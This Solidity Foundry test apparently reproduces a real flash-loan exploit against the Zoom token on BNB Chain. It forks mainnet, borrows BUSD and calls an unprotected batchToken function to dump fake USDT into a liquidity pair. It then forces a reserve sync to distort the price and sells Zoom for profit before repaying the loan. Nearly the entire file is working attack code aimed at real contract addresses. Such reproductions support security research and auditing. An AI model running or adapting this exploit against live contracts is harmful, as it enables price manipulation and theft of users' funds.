pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";
import "forge-std/console.sol";

interface IUSD {
    function batchToken(
        address[] calldata _addr,
        uint256[] calldata _num,
        address token
    ) external;

    function swapTokensForExactTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function buy(uint256) external;

    function sell(uint256) external;

    function getReserves()
        external
        view
        returns (
            uint112 _reserve0,
            uint112 _reserve1,
            uint32 _blockTimestampLast
        );

    function sync() external;
}

contract ContractTest is DSTest {
    address private swap = 0x5a9846062524631C01ec11684539623DAb1Fae58;
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 Zoom = IERC20(0x9CE084C378B3E65A164aeba12015ef3881E0F853);
    IERC20 private FAKEUSDT =
        IERC20(0x62D51AACb079e882b1cb7877438de485Cba0dD3f); // fake usdt

    address private batch = 0x47391071824569F29381DFEaf2f1b47A4004933B;

    IPancakePair FLASHLOAN_POOL =
        IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);

    IPancakePair pairs =
        IPancakePair(0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5); //FAKEUSDT -- ZOOM LP

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 21055930); //fork mainnet at block 21055931
    }

    function testLoan() public payable {
        console.log("token0  ", pairs.token0()); //fakeusdt
        console.log("token1  ", pairs.token1()); // zoom
        FLASHLOAN_POOL.swap(3000000 * 1e18, 0, address(this), new bytes(1));
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        sender;
        amount0;
        amount1;
        data;
   
        BUSD.approve(swap, type(uint256).max);
        IUSD(swap).buy(BUSD.balanceOf(address(this))); // swap BUSD to ZOOM
        console.log("Zoom balance  ", Zoom.balanceOf(address(this)) / 1e18);

        address[] memory toPath = new address[](1);
        toPath[0] = address(pairs);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000000 * 1e18;
        console.log(
            "Before batchToken() pairs  balance of  FAKEUSDT ",
            FAKEUSDT.balanceOf(address(pairs)) / 1e18
        );

        IUSD(batch).batchToken(toPath, amounts, address(FAKEUSDT)); // transfer FAKEUSDT to pairs  from batch contract
        pairs.sync();   // update sync reserve0 „ÄÅreserve1 

        console.log(
            "After batchToken() pairs  balance of  FAKEUSDT ",
            FAKEUSDT.balanceOf(address(pairs)) / 1e18
        );

        Zoom.approve(swap, type(uint256).max);
        // console.log("_reserve0  ", _reserve0 / 1e18);
        console.log(
            "Before sell Zoom balance  ",
            Zoom.balanceOf(address(this)) / 1e18
        );
        IUSD(swap).sell(Zoom.balanceOf(address(this)));
        emit log_named_uint(
            " Before repay balance of BUSD ",
            BUSD.balanceOf(address(this)) / 1e18
        );

        BUSD.transfer(
            address(FLASHLOAN_POOL),
            ((amount0 / 9975) * 10000 + 10000)
        ); 

        emit log_named_uint(
            " expoit complete  balance of BUSD ",
            BUSD.balanceOf(address(this)) / 1e18
        );
    }
}
